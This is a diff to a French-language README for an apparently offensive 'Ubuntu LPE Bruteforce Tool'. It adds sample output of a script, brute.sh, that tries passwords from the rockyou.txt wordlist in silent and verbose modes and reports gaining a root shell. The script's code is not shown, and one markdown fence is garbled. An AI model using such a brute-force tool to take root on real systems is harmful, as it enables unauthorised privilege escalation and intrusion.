@@ -23,7 +23,66 @@ Mode verbeux (avec la liste de passwords qui défilent)
 bash brute.sh rockyou.txt --verbose
 ```
 
+Silent mode
+```
+🔍 Bruteforce en cours...
+📁 Wordlist: rockyou.txt
+📊 Mode verbose: DÉSACTIVÉ
 
+⏳ Test en cours (mode silencieux)...
+⏳ Test en cours (14344381 mots de passe)...
+✅ Mot de passe trouvé : rockyou [8]
+🐚 VOUS ÊTES MAINTENANT ROOT !
+🚀 Tapez simplement 'sudo su' !
+Complété
+
+🎉 MOT DE PASSE TROUVÉ: 'rockyou'
+🐚 Ouverture du shell root...
+✅ Accès root confirmé !
+🚀 Lancement du shell root...
+
+```erbose mo
+```bash
+ubuntu@swift:~/brute_ubuntu_lpe$ bash brute.sh rockyou.txt --verbose🔍 Bruteforce en cours...
+📁 Wordlist: rockyou.txt
+📊 Mode verbose: ACTIVÉ
+
+📋 Liste des mots de passe testés (défilement en direct):
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🔍 Début du bruteforce avec 14344381 mots de passe...
+💡 Appuyez sur Ctrl+C pour arrêter
+
+📋 Liste des mots de passe testés:
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+[1] Test mot de passe: 123456
+[2] Test mot de passe: 12345
+[3] Test mot de passe: 123456789
+[4] Test mot de passe: password
+[5] Test mot de passe: iloveyou
+[6] Test mot de passe: princess
+[7] Test mot de passe: 1234567
+[8] Test mot de passe: rockyou
+[9] Test mot de passe: 12345678
+[10] Test mot de passe: abc123
+[11] Test mot de passe: nicole
+[12] Test mot de passe: daniel
+[13] Test mot de passe: babygirl
+[14] Test mot de passe: monkey
+[15] Test mot de passe: lovely
+[16] Test mot de passe: jessica
+✅ Mot de passe trouvé : rockyou [8]
+🐚 VOUS ÊTES MAINTENANT ROOT !
+🚀 Tapez simplement 'sudo su' !
+Complété
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🎉 MOT DE PASSE TROUVÉ: 'rockyou'
+🐚 Ouverture du shell root...
+✅ Accès root confirmé !
+🚀 Lancement du shell root...
+
+```
 
 # Ubuntu LPE Bruteforce Tool (CWE-208 Based)
 
